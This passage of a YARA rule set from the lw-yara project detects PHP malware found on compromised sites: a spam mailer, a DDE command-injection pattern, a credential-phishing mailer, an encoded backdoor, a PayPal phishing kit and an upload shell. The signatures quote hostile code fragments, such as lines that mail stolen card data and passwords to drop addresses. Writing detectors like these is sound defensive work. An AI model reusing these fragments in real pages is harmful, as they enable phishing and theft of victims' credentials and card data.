      hash1 = "eec9fc9c2a24434541e7b3b26f5401a81ffbc12ecbbe3c0e728fecee71146259"
   strings:
      $x1 = "curl_setopt($ch, CURLOPT_USERAGENT, \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.1; .NET CLR 1.1.4322)\");" fullword ascii
      $x2 = "if ($urlShell === false && preg_match('/' . preg_quote(\"[shell_rewrite_url]\", \"/\") . '/i', $Command['content'])) {" fullword ascii
      $s3 = "$privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : @file_get_contents($this->DKIM_private);" fullword ascii
      $s4 = "$mime[] = sprintf('Content-Type: %s; name=\"%s\"%s', $type, $this->encodeHeader($this->secureHeader($name)), $this->LE);" fullword ascii
      $s5 = "if (version_compare(PHP_VERSION, '5.3.0') >= 0 and in_array('sha256WithRSAEncryption', openssl_get_md_methods(true))) {" fullword ascii
      $s6 = "if (!$this->sendCommand('User & Password', base64_encode(\"\\0\" . $username . \"\\0\" . $password), 235)) {" fullword ascii
      $s7 = "$checkread = @GetPageContent(' . $Function2 . '() . $image_name . \"?\" . http_build_query($parameters) );" fullword ascii
      $s8 = "$mime[] = sprintf('Content-Type: %s; name=\"%s\"%s', $type, $this->encodeHeader($this->secureHeader($name)), $" fullword ascii
      $s9 = "$mime[] = sprintf('Content-Disposition: %s; filename=%s%s', $disposition, $encoded_name, $this->LE . $this->LE);" fullword ascii
      $s10 = "$SERVER_INFOS['REAL_IP_GET']     = GetPageContent(\"http://myip.dnsomatic.com/\");" fullword ascii
      $s11 = "return $this->language[$key] . ' https://github.com/SilthxMailer/SilthxMailer/wiki/Troubleshooting';" fullword ascii
      $s12 = "$this->smtp_conn = @stream_socket_client($host . \":\" . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, " fullword ascii
      $s13 = "$mime[] = sprintf('Content-Disposition: %s; filename=%s%s', $disposition, $encoded_name, $this->LE ." fullword ascii
      $s14 = "$mail->addStringAttachment(GetPageContent($Command['file']), $Command['filename'] . \".\" . $FileExtension);" fullword ascii
      $s15 = "fwrite($SocksSocket, pack(\"C4Nn\", 0x05, 0x01, 0x00, 0x01, ip2long(gethostbyname($host)), $port));" fullword ascii
      $s16 = "return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\\/\\\\1>/si', '', $html))), E" fullword ascii
      $s17 = "$noerror         = $this->sendCommand($hello, $hello . ' ' . $host, 250);" fullword ascii
      $s18 = "$this->edebug(\"The SOCKS server failed to connect to the specificed host and port. ( \" . $host . \":\" . $port . \"" fullword ascii
      $s19 = "return (strlen($address) >= 3 and strpos($address, '@') >= 1 and strpos($address, '@') != strlen($address) - 1);" fullword ascii
      $s20 = "$mime[] = sprintf('Content-Disposition: %s; filename=\"%s\"%s', $disposition, $encoded_name, $this->LE . $this->LE);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 400KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Date: 2018-11-10
   Identifier: 11-10-18
   Reference: https://github.com/Hestat/lw-yara/
   Reference1: https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation
*/
rule obfuscated_dde
{
    strings:
        $dde_command_1 = /[=+-]+[0-9A-Za-z_&^=\/*\(\x00]*((c[\x00]*m[\x00]*d\|)|(m[\x00]*s[\x00]*i[\x00]*e[\x00]*x[\x00]*c[\x00]*l\|)|(r[\x00]*u[\x00]*e[\x00]*n[\x00]*g[\x00]*d[\x00]*s[\x00]*l[\x00]*l[\x00]*r[\x00]*3[\x00]*2[0-9A-Za-z\x00]*\|)|(c[\x00]*e[\x00]*r[\x00]*t[\x00]*u[\x00]*t[\x00]*i[\x00]*l[\x00]*[0-9A-Za-z\x00]*\|))\'/

    condition:
        $dde_command_1
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-18
   Identifier: emailcode
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_10_18_18_onedrive_emailcode {
   meta:
      description = "emailcode - file email.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-18"
      hash1 = "3ca994b4976f7928e3032da13d73159fdb1e8eccd1438b52f522050f3938ffa7"
   strings:
      $x1 = "header('Location: https://login.microsoftonline.com/common/oauth2');" fullword ascii
      $s2 = "$subject = \"Office login attempt -- \".$ip;" fullword ascii
      $s3 = "$subject = \"Outlook login attempt -- \".$ip;" fullword ascii
      $s4 = "$subject = \"other login attempt -- \".$ip;" fullword ascii
      $s5 = "$subject = \"Webmail login attempt -- \".$ip;" fullword ascii
      $s6 = "$message .= \"Login Type Selection -- Outlook \\n\";" fullword ascii
      $s7 = "$message .= \"Login Type Selection -- Webmail \\n\";" fullword ascii
      $s8 = "$message .= \"Login Type Selection -- Office \\n\";" fullword ascii
      $s9 = "$message .= \"Login Type Selection -- other \\n\";" fullword ascii
      $s10 = "$ip_data = str_replace('&quot;', '\"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/" fullword ascii
      $s11 = "$message .= \"Password -- $password\\n\";" fullword ascii
      $s12 = "$headers .= 'Content-type: text/html; charset=iso-8859-1' . \"\\r\\n\"; " fullword ascii
      $s13 = "// To send HTML mail, the Content-type header must be set" fullword ascii
      $s14 = "$headers .= \"Content-Type: text/html; charset=ISO-8859-1\\r\\n\";" fullword ascii
      $s15 = "$message .= \"Username/Email -- $email\\n\";" fullword ascii
      $s16 = "$admin_email" fullword ascii
      $s17 = "$formname = $_REQUEST['logintype'];" fullword ascii
      $s18 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s19 = "curl_setopt($ch, CURLOPT_URL, \"http://www.geoplugin.net/json.gp?ip=\".$ip);" fullword ascii
      $s20 = "$message .= \"Region Detected --  \".$region.\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-04
   Identifier: case115
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_06_04_18_case115_pass {
   meta:
      description = "case115 - file pass.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
      hash1 = "8ba235a103b4fe43724627700b0a98090fdd604f4c975096f460285aaecf7934"
   strings:
      $s1 = "ethod=\"post\"><input type=\"text\" name=\"g__g_\" value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>" fullword ascii
      $s2 = "oP9xzgrUWQ455KjxUGC7TwCgGr7kukd2QjDpSGy33YI4e+LK5QdPH7g9e2LDeR8dYJ+2cPQaspyTv1mq" fullword ascii
      $s3 = "eSye00TQ7GbfTpcFAYimlc4AML8in9Dk6rOdISD16mBgGxcSA0A/ltnHduQBC4m14j5zz4YJ3VCLOmIg" fullword ascii
      $s4 = "7xRCyvW3ECsutYKPu1xjdlB4M2BftQZdHWNwBCIiHZWlEiZvubDbhdlLteOPOwLBSoagBrDyGuyfkU3W" fullword ascii
      $s5 = "mG/qqIk2c3wPzaQVSueYebZXq5S0bX+Agx3SB0yL/aHRe8wdAtC4NV7SzmskL90qegRrOcrC4L7WERfz" fullword ascii
      $s6 = "2AqIYrkuI2rCUQWPdzJpHhickkQNKaIrclX3Of/qSvktVcWYB6Jl+eFqQ68vZ+j9ji1DpR5nsN/NNHDj" fullword ascii
      $s7 = "WZlIlYFfLHK6Oeot4IZAAq8EGa6hcbsJF6F6ajoV7S+VUo+eDyuOCNQwZYOrancHsIvfaILmuw9Fmu7Z" fullword ascii
      $s8 = "X2U7+c7e3PO75SM04UiSYm4a9TVmqV4Ycx5L+OPcNiZwULpBIRGDCCAZbjPfN/Xr2WUELRbg/7eYEpuF" fullword ascii
      $s9 = "V3Da66hAEfYbo+OQY9lWTEWgBzDblzKHEF6M9e3C9ATS//77Y/wET7jtsp0XnPuKCwKsiaSGybCHuZEl" fullword ascii
      $s10 = "BPw/UEyxmpRdFoB5R0Zob3fjt//5wKrOdTPwzEcPfI11SaIFHq/pmDiyZX7J3kqdRE6SA64ZvZU/CqJt" fullword ascii
      $s11 = "w090ZCI8Yx3srTP1KTedjR52H420Gt772lzbm5J1bLMAznnV2//qYodb6r+r4Fno7BAhJVJxUWzVcQVa" fullword ascii
      $s12 = "IpUAF3pqT5+QNduq//mHMODR+XDNYbswldNe8ZJbDFf6Aera5rZHWVQQR/i2stOius9E9/1EqRs7U41y" fullword ascii
      $s13 = "1HWXuytC9//fFFJ/UGELdfON2EmgHPtEBp02g7S7AQPhQGYpKrpp8sF1RO1UtTyZF0ebHypdWjGACPx3" fullword ascii
      $s14 = "R/d+PLLjtyB3N5RY2HQfZ09zeLtxb69fDfgXtSDmk7TAnDeasxRl/I4zzwjihgUmGaZGuFegcwIW24bu" fullword ascii
      $s15 = "Wail1S7z+/lhDGYv2b8OxhJUVwA8eiZ/rBi7/trxk/q5uABymJNW0qSUzZgk7/A/RMK+5Py1IlYhg5qx" fullword ascii
      $s16 = "QDWQCraGL/ZsBRIDDu3Dky5SCnCkib05Xq5kMW9R6a/C/+6h/X8mT+9HkAYmSKzV6R3wv4utRAwyWzp5" fullword ascii
      $s17 = "9vg4+dxL5doJSTw/2/vr8dlnBqxgxRNJe6LNb8kTeWSLcVD0IZvPEdHRWs3Q3Kyc+iyDnHgJro5LgIln" fullword ascii
      $s18 = "UOnOK8gzQzAkt8belqr6Ak8HcQXNCueILPbGYDLjBOytcPl33XeXcBYgN7dXD12VnF4oXd0W4+9/p/MA" fullword ascii
      $s19 = "utkxax8uTwnFfSMkQ1st+VwAKuo68/Y/kw/MKAYsGfMEvuA4Mn2eMiO0STTqMbRVG+Ud0hvlU/pwievk" fullword ascii
      $s20 = "w3wd5iQIs/rpw4T/V/JZfFYriedCYfoOPign4lFZoNNqgkJ5ZT5IEslEKM7z+LlBkEPzw0+bhpb67LtC" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 60KB and
         ( 8 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-08
   Identifier: case127
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier3 {
   meta:
      description = "case127 - file N_Vier3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "4a2b4e794a6719748601485e3befdccc7f4c39cb81a5677192aa78b633720c9d"
   strings:
      $s1 = "header(\"location: Congratulations.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
      $s2 = "mail(\"rezult277@gmail.com\", $subject, $message, $headers);" fullword ascii
      $s3 = "$message .= \"IP Geo       : http://www.geoiptool.com/?IP=\".$ip.\"  ====\\n\";" fullword ascii
      $s4 = "$message .= '|Numero de compte                       :  '.$_SESSION['accnum'].\"\\r\\n\";" fullword ascii
      $s5 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s6 = "$message .= '|Full name                :  '.$_SESSION['fname'].' '.$_SESSION['lname'].\"\\r\\n\";" fullword ascii
      $s7 = "$message .= '|Expiry date              :  '.$_POST['exdate'].\"\\r\\n\";" fullword ascii
      $s8 = "$message .= '|CVV                        :  '.$_POST['cvv'].\"\\r\\n\";" fullword ascii
      $s9 = "$message .= '|phone                :  '.$_SESSION['fnumber'].\"\\r\\n\";" fullword ascii
      $s10 = "$message .= '|date of birth               :  '.$_SESSION['dob'].\"\\r\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier2 {
   meta:
      description = "case127 - file N_Vier2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "e6261f3642a19a3d73ab057136bd78fa05361532f922a8e62b5505987d7fa2a3"
   strings:
      $s1 = "header(\"location: Credit card.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
      $s2 = "$_SESSION['fnumber'] = $_POST['fnumber'];" fullword ascii
      $s3 = "$_SESSION['lname'] = $_POST['lname'];" fullword ascii
      $s4 = "$_SESSION['zip'] = $_POST['zip'];" fullword ascii
      $s5 = "$_SESSION['fname'] = $_POST['fname'];" fullword ascii
      $s6 = "$_SESSION['dob'] = $_POST['dob'];" fullword ascii
      $s7 = "$_SESSION['sort'] = $_POST['sort'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule Congratulations {
   meta:
      description = "case127 - file Congratulations.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "37630f4a947fe6f850756502200f36fbcb2fb04c4e3484fb290698b85a3ffcd4"
   strings:
      $s1 = "<meta http-equiv=\"refresh\" content=\"5; url=https://www.paypal.com/\">" fullword ascii
      $s2 = "9ff;\" href=\"https://www.paypal.com/\" >cliquez ici</a> </p>" fullword ascii
      $s3 = "<p style=\"font-size:12px;\">Si cette page appara&icirc;t pendant plus de 10 secondes, <a style=\"text-decoration: none;color: #" ascii
      $s4 = "<h1>F&eacute;licitations, Confirmation Termin&eacute; !</h1>" fullword ascii
      $s5 = "<center><img src=\"images/pasy.gif\" /></center><br />" fullword ascii
      $s6 = "<link rel=\"stylesheet\" href=\"css/styl.css\" />" fullword ascii
      $s7 = "<link rel=\"stylesheet\" href=\"css/normalize.css\" />" fullword ascii
      $s8 = "<link rel=\"icon\" href=\"images/pp_favicon_x.ico\" />" fullword ascii
      $s9 = "/ =     =    =   -  ( =  =    = )  -   =  =       = \\" fullword ascii
   condition:
      ( uint16(0) == 0x0a0d and
         filesize < 8KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_thnks {
   meta:
      description = "case127 - file thnks.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "bb2b6b173f380d6e76f12dea48447d53632d2cd5dc9c73807139dfab8510778e"
   strings:
      $x1 = "</ul></section></div></div></div></div></div></div><div id=\"footer\" class=\"noPrint nemo_footer vx_globalFooter-container\" ro" ascii
      $x2 = "<script type=\"text/javascript\" src=\"./PayPal_ Summary1_files/customer.js.download\" async=\"\"></script><script type=\"text/j" ascii
      $x3 = "</span></a></div></div></div></div><a href=\"###\" class=\"js_dismiss emClose nemo_emClose\" role=\"button\" name=\"EM_DownloadA" ascii
      $x4 = "<!-- saved from url=(0077)file:///C:/Users/SpreadWorm/Desktop/Nouveau%20dossier/PayPal_%20Summary1.html -->" fullword ascii
      $s5 = "nemo_appSelect\"><span class=\"icon icon-medium icon-phone\" aria-hidden=\"true\"></span>Get the PayPal app</a></li><li class=\"" ascii
      $s6 = "<meta http-equiv=\"Refresh\" content=\"5;url=https://www.paypal.com/\">" fullword ascii
      $s7 = "aypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js\" src=\"./PayPal_ Summary1_files" ascii
      $s8 = "s free in the U.S. when you use bank or balance.</p></div></div></div><a href=\"###\" class=\"js_dismiss emClose nemo_emClose\" " ascii
      $s9 = "<html dir=\"ltr\" class=\"js\" lang=\"en_US\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">" fullword ascii
      $s10 = "ve covered the basics, have fun <a href=\"##/deals\" target=\"_top\" class=\"popover-link\" name=\"QT_Shopping\" data-pagename=" ascii
      $s11 = "<span class=\"numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText\">No balance needed to shop or send money</span>" ascii
      $s12 = "3526d928f1ae21749d.js.download\"></script><!--Script info: script: node, template:  , date: Nov 19, 2016 18:02:58 -08:00, countr" ascii
      $s13 = "indow.Intl) { document.write('<script src=\"https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/js/lib/shim/" ascii
      $s14 = "A2gPn7kuC5R7jkFaE1mnvPPZcEM\" data-cobrowser=\"{&quot;serverHostUrl&quot;:&quot;https://cb.paypal.com&quot;,&quot;assetHostUrl&q" ascii
      $s15 = "$(this).parent().parent().find('.cc-ddl-o select').attr('selectedIndex', $('.cc-ddl-contents a').index(this));" fullword ascii
      $s16 = "eb/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js\" src=\"./PayPal_ Summary1_files/ajaxError.js(3).d" ascii
      $s17 = "-js-path=\"https://www.paypalobjects.com/web/res/ data-genericerror=\"Please try again.\" data-rlogid=\"GBuHKhnr0kktkGV1HgQNR%2F" ascii
      $s18 = "dule=\"https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/dust-templates.js\" src=\"./PayPa" ascii
      $s19 = "plates/US/en/widgets/ajaxError.js\" src=\"./PayPal_ Summary1_files/ajaxError.js.download\"></script><script type=\"text/javascri" ascii
      $s20 = "ta-requirecontext=\"_\" data-requiremodule=\"https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/U" ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 200KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_index {
   meta:
      description = "case127 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "69ca1894b81eb9f09c5b13e087123901bb27fde0bd5df09b637e2a80a3f720cb"
   strings:
      $s1 = "<meta http-equiv=\"Description\" content=\" notneeded \"><!--googleon: all--><!--googleoff: all-->" fullword ascii
      $s2 = "<meta http-equiv=\"Keywords\" content=\" notneeded \"><!--googleon: all--><!--googleoff: all-->" fullword ascii
      $s3 = "fwrite($file,$ip.\"  -  \".gmdate (\"Y-n-d\").\" @ \".gmdate (\"H:i:s\").\"\\n\");" fullword ascii
      $s4 = "<meta http-equiv=\"refresh\" content=\"0; URL=Connexion.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssM" ascii
      $s5 = "<meta http-equiv=\"refresh\" content=\"0; URL=Connexion.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssM" ascii
      $s6 = "<html><head><title>Chargement</title><!--googleoff: all-->" fullword ascii
      $s7 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s8 = "$file = fopen(\"View.txt\",\"a\");" fullword ascii
      $s9 = "setTimeout(\"window.location.replace('login.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja212154548" ascii
      $s10 = "setTimeout(\"window.location.replace('login.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja212154548" ascii
      $s11 = "<script language=\"JavaScript\" type=\"text/javascript\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule INFORMATION {
   meta:
      description = "case127 - file INFORMATION.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "295818c6e3fcb77d4e04407fc861bc18a6df278f550070b16915da35c3f3bcc9"
   strings:
      $s1 = "mail(\"rezult1996@gmail.com\",'PP Billing Address : '.$ip,$message);" fullword ascii
      $s2 = "<form method=\"POST\" action=\"Congratulations.php\">" fullword ascii
      $s3 = "<i><?=$fname.' '.$lname ?><br /><?=$adds1 ?> <?php  if (strlen($adds2)>1) { echo \"<br />\".$adds2;} ?><br /><?=$c" fullword ascii
      $s4 = "<p>Veuillez &ecirc;tre s&ucirc;r que vos informations sont correctes:</p>" fullword ascii
      $s5 = "Date of birth:\".$dob_day.\"/\".$dob_month.\"/\".$dob_year.\"" fullword ascii
      $s6 = "/*////////////////////////////////////////////////////////////////////////////////////////////////////*/" fullword ascii
      $s7 = "<script src=\"javascript/jquery-1.11.2.min.js\"></script>" fullword ascii
      $s8 = "ity.\",\".$state.\" \".$zip ?><br /><?=$country ?><br /><a id=\"show\" href=\"#\">Edit</a></i><br />" fullword ascii
      $s9 = "<img src=\"images/cvn.jpg\" style=\"margin-left:-100;\" />" fullword ascii
      $s10 = "# Scam By R#5 | contact me on my email address Rush3@live.ru" fullword ascii
      $s11 = "$dob_month = $_POST[\"dob_month\"];" fullword ascii
      $s12 = "$dob_year = $_POST[\"dob_year\"];" fullword ascii
      $s13 = "$(\"#edyear\").css(\"border-color\",\"#ff3f3f\");" fullword ascii
      $s14 = "$(\"#edyear\").css(\"border-color\",\"#B3B3B3\");" fullword ascii
      $s15 = "$(\"#edmonth\").css(\"border-color\",\"#B3B3B3\");" fullword ascii
      $s16 = "$(\"#edmonth\").css(\"border-color\",\"#ff3f3f\");" fullword ascii
      $s17 = "Middle name:\".$mname.\"" fullword ascii
      $s18 = "<link rel=\"stylesheet\" href=\"css/normalize.css\" />" fullword ascii
      $s19 = "<link rel=\"stylesheet\" href=\"css/style.css\" />" fullword ascii
      $s20 = "<link rel=\"icon\" href=\"images/pp_favicon_x.ico\" />" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_my_ID_id {
   meta:
      description = "case127 - file id.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "7b757ad189977023f5e9d940284a5c5840f20f9b744c1656341663bf9b80d7fc"
   strings:
      $s1 = "<form action=\"ID/identity/mail/identity.php\" method=\"post\" enctype=\"multipart/form-data\" onsubmit=\"return ray.ajax()\">" fullword ascii
      $s2 = "<font color=\"#05285c\"> <font id=\"overpanel-header\">  You need documents to prove your identity. </font> </font>" fullword ascii
      $s3 = "<div id=\"load\" class=\"transitioning spinner spin\" style=\"display:none;\">Processing of your documents...</div>" fullword ascii
      $s4 = "<script type=\"text/javascript\" src=\"identity/ds/jquery.min.js\"></script>" fullword ascii
      $s5 = "lblError.html(\"Attach copy of the official document\" );" fullword ascii
      $s6 = "lblError.html(\"Attach copy of the Credit Card (front & back)\" );" fullword ascii
      $s7 = "<div  style=\"height: 0px;\"> <span id=\"lblError2\" class=\"message\"   ></span>  <span  id=\"message1\" ></span> </div>" fullword ascii
      $s8 = "<div  style=\"height: 0px;\"> <span id=\"lblError1\" class=\"message\"   ></span>  <span  id=\"message1\" ></span> </div>" fullword ascii
      $s9 = "<img style=\"height: 116px;width: 278px;\" src=\"./ID/identity/images/card.png\">" fullword ascii
      $s10 = "()])+(\" + allowedFiles.join('|') + \")$\");" fullword ascii
      $s11 = "<input class=\"aaa\"    value=\"Attach copy of the Credit Card\" readonly=\"readonly\" style=\"width: 280px; height: 40px\" />" fullword ascii
      $s12 = "lblError.html('');" fullword ascii
      $s13 = "<img src=\"./ID/identity/images/identity.png\">" fullword ascii
      $s14 = "$(\"body\").on(\"click\", \"#btnUpload\", function () {" fullword ascii
      $s15 = "var lblError = $(\"#lblError2\");" fullword ascii
      $s16 = "var lblError = $(\"#lblError1\");" fullword ascii
      $s17 = "if (!regex.test(fileUpload.val().toLowerCase())) {" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule suspicious {
   meta:
      description = "case127 - file suspicious.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "2ac349b726e19c04c50d3ef33f676848364f8f5f5be70b62604e6f3c35fc6104"
   strings:
      $s1 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\" integrity=\"sha512-K1qjQ+NcF2TYO/eI3M6v8EiN" fullword ascii
      $s2 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s3 = "<p>En cliquant sur continuer, vous confirmez que vous &ecirc;tes le propri&eacute;taire de ce compte.</p>" fullword ascii
      $s4 = "<a href=\"Billing.php?data=billing&execution=<?php echo md5('WorldOfHack'); ?>\" class=\"bt" fullword ascii
      $s5 = "<p>En cliquant sur continuer, vous confirmez que vous &ecirc;tes le propri&eacute;taire de c" fullword ascii
      $s6 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\" integrity=\"sha512-K1qjQ+NcF2TYO/eI3M6v8EiNY" ascii
      $s7 = "Pour prot&eacute;ger votre compte, nous recherchons r&eacute;guli&egrave;rement des signe" fullword ascii
      $s8 = "<h4 class=\"big-title\">L'acc&egrave;s &agrave; votre compte est restreint pour des raisons de s&eacute;curit&eacute;.</h4>" fullword ascii
      $s9 = "<img src=\"css/peek-shield-logo.png\">" fullword ascii
      $s10 = "YZfA95pQumfvcVrTHtwQVDG+aHRqLi/ETn2uB+1JqwYqVG3LIvdm9lj6imS/pQ==\" crossorigin=\"anonymous\">" fullword ascii
      $s11 = "Apr&egrave;s avoir confirm&eacute; votre identit&eacute;, nous examinerons vos informations et" fullword ascii
      $s12 = "<h4 class=\"big-title\">L'acc&egrave;s &agrave; votre compte est restreint pour des raison" fullword ascii
      $s13 = "<label class=\"loginmarker\">" fullword ascii
      $s14 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s15 = "<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s16 = "restaurerons l'acc&egrave;s &agrave; votre compte." fullword ascii
      $s17 = "s pr&eacute;coces d'activit&eacute;s potentiellement frauduleuses." fullword ascii
      $s18 = "<link rel=\"icon\" href=\"css/fav.ico\" />" fullword ascii
      $s19 = "<a href=\"Billing.php?data=billing&execution=<?php echo md5('WorldOfHack'); ?>\" class=\"btn btnPremary\" style=\"width: 200px;" ascii
   condition:
      ( uint16(0) == 0xbbef and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule Credit_card {
   meta:
      description = "case127 - file Credit card.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "96d0b4ab511639620feac0745c91ef95d1d36e6b6e2df7d547d85bba3507f7e1"
   strings:
      $s1 = "<script src=\"http://ajax.microsoft.com/ajax/jquery.validate/1.7/additional-methods.js\"></script>" fullword ascii
      $s2 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s3 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s4 = "<p>Parfois, nous vous poserons une question unique pour v&eacute;rifier qui vous &ecirc;tes.</p>" fullword ascii
      $s5 = "<form method=\"post\" action=\"N_Vier3.php\">" fullword ascii
      $s6 = "<p>Notre &eacute;quipe de s&eacute;curit&eacute; travaille 24/7 pour vous prot&eacute;ger. Nous sommes l" fullword ascii
      $s7 = "<input required pattern=\"([0][1-9]|[1][0-2])(/)([2][0][1][7-9]|[2][0][2][0-5])\" type=\"text\" " fullword ascii
      $s8 = "<input required pattern=\".{16,16}\" type=\"tel\" autocomplete=\"off\" name=\"cardnumber\" style=\"border: no" fullword ascii
      $s9 = "<input required pattern=\".{3,3}\" type=\"text\" autocomplete=\"off\" name=\"cvv\" class=\"cc-cvc\" st" fullword ascii
      $s10 = "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s11 = "SESSION['exDate'])){}else{ echo $_SESSION['exDate'];} ?>\">" fullword ascii
      $s12 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s13 = "yle=\"border: none\" placeholder=\"CVV (CVC)\" maxlength=\"4\" value=\"\">" fullword ascii
      $s14 = "<button type=\"submit\" class=\"btn btnPremary\" id=\"submit\" name=\"btnCard\" style=\"padding-left: 30p" fullword ascii
      $s15 = "<h2>Aidez-nous &agrave; vous garder en s&eacute;curit&eacute;</h2>" fullword ascii
      $s16 = "<div class=\"textinputs inputspecial\" style=\"width: 43%;float: right;margin: 6px 10px 6px 0px;\">" fullword ascii
      $s17 = "<div class=\"textinputs inputspecial\" style=\"width: 48%;float: left;margin: 6px 0px 6px 10px;\">" fullword ascii
      $s18 = "<link rel=\"icon\" href=\"css/fav.ico\" />" fullword ascii
      $s19 = "var validCvc = $.payment.validateCardCVC($('input.cc-cvc').val(), cardType);" fullword ascii
      $s20 = "if($('.textinputs input').val().length === 0){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_06_08_18_case127_yara_upxxx {
   meta:
      description = "case127 - file upxxx.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "b364b42e478e199d30b322b60d6d5f478636b311db63344f4adba565dba0c2ee"
   strings:
      $s1 = "@move_uploaded_file($userfile_tmp, $abod);" fullword ascii
      $s2 = "$userfile_tmp = $_FILES['image']['tmp_name'];" fullword ascii
      $s3 = "echo\"<center><b>Done ==> $userfile_name</b></center>\";" fullword ascii
      $s4 = "$userfile_name = $_FILES['image']['name'];" fullword ascii
      $s5 = "if(isset($_POST['Submit'])){" fullword ascii
      $s6 = "$abod = $filedir.$userfile_name;" fullword ascii
   condition:
